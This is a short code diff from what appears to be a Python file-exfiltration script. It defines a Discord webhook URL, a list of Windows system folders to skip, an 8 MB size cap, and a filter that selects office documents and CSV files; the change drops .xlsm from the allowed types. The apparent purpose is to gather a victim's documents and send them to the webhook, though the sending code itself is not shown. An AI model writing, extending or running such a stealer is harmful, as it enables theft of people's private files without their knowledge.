@@ -34,7 +34,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1183181478645997698/bmS94RKPMhnf
 BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Users\\%a\\AppData\\', 'C:\\Users\\%a\\OneDrive\\Documents\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\', 'C:\\XboxGames\\', 'C:\\Users\\Default\\', 'C:\\Users\\defaultuser100000\\', 'C:\\Users\\Public\\', 'C:\\Users\\%a\\3D Objects\\', 'C:\\Users\\%a\\Contacts\\', 'C:\\Users\\%a\\Favorites\\', 'C:\\Users\\%a\\Microsoft\\', 'C:\\Users\\%a\\Music\\', 'C:\\Users\\%a\\OneDrive\\Documents\\', 'C:\\Users\\%a\\Saved Games\\', 'C:\\Users\\%a\\Searches\\', 'C:\\Users\\%a\\Tracing\\', 'C:\\Users\\%a\\NTUSER.DAT\\', 'C:\\Users\\%a\\.thinkorswim\\']
 MAX_FILE_SIZE_MB = 8
 def check_file(file_path):
-    allowed_extensions = ['.pdf', '.docx', '.xls', '.xlsx', '.docx', '.xlsm', '.csv']
+    allowed_extensions = ['.pdf', '.docx', '.xls', '.xlsx', '.docx', '.csv']
     max_size_mb = 8
     if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
         print(f"Skipping file {file_path} - invalid file type")
